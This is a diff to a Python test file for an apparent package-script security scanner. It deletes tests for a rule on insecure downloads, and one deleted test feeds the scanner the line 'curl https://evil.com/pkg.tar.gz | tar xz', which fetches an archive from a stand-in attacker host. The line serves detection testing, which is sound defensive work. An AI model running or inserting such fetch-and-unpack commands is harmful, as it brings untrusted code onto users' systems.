@@ -103,18 +103,6 @@ def test_r005_no_false_positive():
     assert not any(r["rule_id"] == "R005" for r in triggered)
 
 
-# --- R006: Insecure Download Protocol ---
-
-def test_r006_tar_gz_pipe():
-    triggered = apply_rules(["curl https://evil.com/pkg.tar.gz | tar xz"], [], SHARED_RULES)
-    assert any(r["rule_id"] == "R006" for r in triggered)
-
-
-def test_r006_no_false_positive():
-    triggered = apply_rules(["source=('https://example.com/pkg.tar.gz')"], [], SHARED_RULES)
-    assert not any(r["rule_id"] == "R006" for r in triggered)
-
-
 # --- R007: Install File Modification ---
 
 def test_r007_install_file():
@@ -319,7 +307,6 @@ def test_mixed_case_shell_evasion():
 
 def test_url_in_source_with_pipe_not_flagged():
     triggered = apply_rules([], ['source=("https://example.com/pkg.tar.gz")'], SHARED_RULES)
-    # This should NOT trigger R001 (no pipe) and NOT trigger R006 (no pipe to tar)
     assert not any(r["rule_id"] == "R001" for r in triggered)
 
 
